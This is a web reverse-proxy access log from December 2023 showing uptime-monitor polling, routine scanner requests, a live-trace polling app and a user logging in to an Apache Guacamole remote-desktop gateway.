89.187.178.158 - - [14/Dec/2023:14:54:43 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 529 "-" "-" 2323 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:14:54:44 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 603 "-" "-" 2324 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:14:54:45 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 677 "-" "-" 2325 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:14:54:46 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 751 "-" "-" 2326 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:14:54:47 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 1050 "-" "-" 2327 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [14/Dec/2023:14:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2328 "www@docker" "http://172.25.0.8:80" 1ms
35.203.210.196 - - [14/Dec/2023:14:55:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2329 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:14:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2330 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2331 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2332 "www@docker" "http://172.25.0.8:80" 0ms
185.224.128.191 - - [14/Dec/2023:14:57:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2333 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2334 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2335 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2336 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2337 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2338 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2339 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2340 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2341 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2342 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2343 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2344 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2345 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:15:02:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2346 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:15:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2347 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2348 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2349 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2350 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2351 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2352 "www@docker" "http://172.25.0.8:80" 1ms
71.6.146.186 - - [14/Dec/2023:15:06:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2353 "web-to-websecure@internal" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:06:03 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 2354 "web-to-websecure@internal" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:06:03 +0000] "GET /sitemap.xml HTTP/1.1" 301 17 "-" "-" 2355 "web-to-websecure@internal" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:06:04 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 17 "-" "-" 2356 "web-to-websecure@internal" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:06:04 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 2357 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:15:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2358 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2359 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2360 "www@docker" "http://172.25.0.8:80" 1ms
165.154.174.108 - - [14/Dec/2023:15:07:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2361 "-" "-" 0ms
165.154.100.58 - - [14/Dec/2023:15:07:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2362 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:15:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2363 "www@docker" "http://172.25.0.8:80" 0ms
165.154.174.108 - - [14/Dec/2023:15:07:45 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2364 "-" "-" 0ms
165.154.100.58 - - [14/Dec/2023:15:07:45 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2365 "-" "-" 0ms
165.154.174.108 - - [14/Dec/2023:15:07:46 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2366 "-" "-" 0ms
165.154.100.58 - - [14/Dec/2023:15:07:47 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2367 "-" "-" 0ms
165.154.174.108 - - [14/Dec/2023:15:07:48 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2368 "-" "-" 0ms
165.154.100.58 - - [14/Dec/2023:15:07:48 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2369 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:15:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2370 "www@docker" "http://172.25.0.8:80" 1ms
192.241.195.114 - - [14/Dec/2023:15:08:31 +0000] "GET /version HTTP/1.1" 404 19 "-" "-" 2371 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:15:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2372 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2373 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2374 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2375 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2376 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2377 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2378 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2379 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2380 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2381 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2382 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2383 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2384 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2385 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2386 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2387 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2388 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2389 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2390 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2391 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2392 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2393 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2394 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2395 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2396 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2397 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2398 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2399 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2400 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2401 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2402 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:23:56 +0000] "GET /pub/ HTTP/2.0" 200 11824 "-" "-" 2403 "www@docker" "http://172.25.0.8:80" 209ms
129.55.200.20 - - [14/Dec/2023:15:23:56 +0000] "GET /pub/app/assets/app.css?id=87a8bca086256c2fc5ed2391763bc488 HTTP/2.0" 304 0 "-" "-" 2404 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:23:56 +0000] "GET /pub/app/assets/hljs-github.css?id=340e65ffd5c17713efc9107c06304f7b HTTP/2.0" 304 0 "-" "-" 2405 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:23:56 +0000] "GET /pub/app/assets/hljs-github-dark.css HTTP/2.0" 200 1315 "-" "-" 2406 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:23:56 +0000] "GET /pub/app/assets/app.js?id=51b74d1a36f3c81b48e624d2a07d9864 HTTP/2.0" 304 0 "-" "-" 2407 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:23:56 +0000] "GET /pub/app/assets/webfonts/fa-solid-900.woff2 HTTP/2.0" 304 0 "-" "-" 2408 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:23:56 +0000] "GET /pub/app/assets/webfonts/fa-brands-400.woff2 HTTP/2.0" 304 0 "-" "-" 2409 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:23:59 +0000] "GET /pub/ HTTP/2.0" 200 11824 "-" "-" 2410 "www@docker" "http://172.25.0.8:80" 12ms
129.55.200.20 - - [14/Dec/2023:15:24:07 +0000] "GET /ip/ HTTP/2.0" 404 555 "-" "-" 2411 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:24:07 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 2412 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:11 +0000] "GET /trace HTTP/2.0" 200 758 "-" "-" 2413 "livetrace@docker" "http://172.25.0.5:80" 76ms
129.55.200.20 - - [14/Dec/2023:15:24:12 +0000] "GET /script.js HTTP/2.0" 404 555 "-" "-" 2414 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:24:12 +0000] "GET /styles.css HTTP/2.0" 304 0 "-" "-" 2415 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2416 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:24:26 +0000] "GET /trace/ HTTP/2.0" 200 758 "-" "-" 2417 "livetrace@docker" "http://172.25.0.5:80" 4ms
129.55.200.20 - - [14/Dec/2023:15:24:26 +0000] "GET /trace/styles.css HTTP/2.0" 200 629 "-" "-" 2418 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:26 +0000] "GET /trace/script.js HTTP/2.0" 200 1174 "-" "-" 2419 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:27 +0000] "GET /trace/start.php?id=nqe8tywva HTTP/2.0" 200 103 "-" "-" 2420 "livetrace@docker" "http://172.25.0.5:80" 3ms
129.55.200.20 - - [14/Dec/2023:15:24:28 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2421 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:29 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2422 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:30 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2423 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:31 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2424 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:32 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2425 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:33 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2426 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:24:34 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2427 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:35 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2428 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:36 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2429 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:37 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2430 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:38 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2431 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2432 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:24:39 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2433 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:40 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2434 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:41 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2435 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:24:42 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2436 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:24:43 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2437 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:44 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2438 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:45 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 83 "-" "-" 2439 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:24:46 +0000] "GET /trace/poll.php?id=nqe8tywva HTTP/2.0" 200 245 "-" "-" 2440 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2441 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2442 "www@docker" "http://172.25.0.8:80" 1ms
165.154.33.72 - - [14/Dec/2023:15:25:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2443 "-" "-" 0ms
129.55.200.20 - - [14/Dec/2023:15:26:04 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 2444 "guacamole@docker" "http://172.25.0.9:8080" 179ms
129.55.200.20 - - [14/Dec/2023:15:26:04 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 200 1987 "-" "-" 2445 "guacamole@docker" "http://172.25.0.9:8080" 17ms
129.55.200.20 - - [14/Dec/2023:15:26:04 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 200 6482 "-" "-" 2446 "guacamole@docker" "http://172.25.0.9:8080" 13ms
129.55.200.20 - - [14/Dec/2023:15:26:05 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 2448 "guacamole@docker" "http://172.25.0.9:8080" 140ms
129.55.200.20 - - [14/Dec/2023:15:26:05 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 2447 "guacamole@docker" "http://172.25.0.9:8080" 163ms
129.55.200.20 - - [14/Dec/2023:15:26:05 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 2450 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:15:26:05 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 257 "-" "-" 2449 "guacamole@docker" "http://172.25.0.9:8080" 939ms
165.154.33.72 - - [14/Dec/2023:15:26:08 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2451 "-" "-" 0ms
165.154.33.72 - - [14/Dec/2023:15:26:10 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2452 "-" "-" 0ms
165.154.33.72 - - [14/Dec/2023:15:26:12 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2453 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:15:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2454 "www@docker" "http://172.25.0.8:80" 1ms
91.92.243.232 - - [14/Dec/2023:15:26:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2455 "web-to-websecure@internal" "-" 0ms
129.55.200.20 - - [14/Dec/2023:15:26:37 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 261 "-" "-" 2456 "guacamole@docker" "http://172.25.0.9:8080" 155ms
167.71.120.76 - - [14/Dec/2023:15:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2457 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2458 "guacamole@docker" "http://172.25.0.9:8080" 66ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "DELETE /guacamole/api/session HTTP/2.0" 403 192 "-" "-" 2459 "guacamole@docker" "http://172.25.0.9:8080" 9ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2460 "guacamole@docker" "http://172.25.0.9:8080" 14ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 2464 "guacamole@docker" "http://172.25.0.9:8080" 67ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 2462 "guacamole@docker" "http://172.25.0.9:8080" 97ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 2461 "guacamole@docker" "http://172.25.0.9:8080" 291ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 2463 "guacamole@docker" "http://172.25.0.9:8080" 305ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 2467 "guacamole@docker" "http://172.25.0.9:8080" 10ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 2465 "guacamole@docker" "http://172.25.0.9:8080" 94ms
129.55.200.20 - - [14/Dec/2023:15:26:39 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 2466 "guacamole@docker" "http://172.25.0.9:8080" 112ms
129.55.200.20 - - [14/Dec/2023:15:26:45 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2468 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:15:26:45 +0000] "GET /guacamole/api/session/data/mysql/connections/5 HTTP/2.0" 200 296 "-" "-" 2469 "guacamole@docker" "http://172.25.0.9:8080" 45ms
129.55.200.20 - - [14/Dec/2023:15:26:45 +0000] "GET /guacamole/api/session/tunnels/b541443d-5b68-3db2-8986-d536ebb2daf9/protocol HTTP/2.0" 200 2512 "-" "-" 2471 "guacamole@docker" "http://172.25.0.9:8080" 27ms
129.55.200.20 - - [14/Dec/2023:15:26:45 +0000] "GET /guacamole/api/session/tunnels/b541443d-5b68-3db2-8986-d536ebb2daf9/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2472 "guacamole@docker" "http://172.25.0.9:8080" 129ms
129.55.200.20 - - [14/Dec/2023:15:26:51 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 2473 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:15:26:51 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 2474 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:15:26:51 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 2475 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:15:26:51 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 2478 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:15:26:51 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2477 "guacamole@docker" "http://172.25.0.9:8080" 10ms
129.55.200.20 - - [14/Dec/2023:15:26:51 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 2476 "guacamole@docker" "http://172.25.0.9:8080" 17ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 2482 "guacamole@docker" "http://172.25.0.9:8080" 9ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 2481 "guacamole@docker" "http://172.25.0.9:8080" 10ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 2483 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 2479 "guacamole@docker" "http://172.25.0.9:8080" 90ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 741 "-" "-" 2480 "guacamole@docker" "http://172.25.0.9:8080" 108ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 2486 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 2484 "guacamole@docker" "http://172.25.0.9:8080" 62ms
129.55.200.20 - - [14/Dec/2023:15:26:52 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 2485 "guacamole@docker" "http://172.25.0.9:8080" 66ms
159.203.109.206 - - [14/Dec/2023:15:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2487 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2488 "www@docker" "http://172.25.0.8:80" 1ms
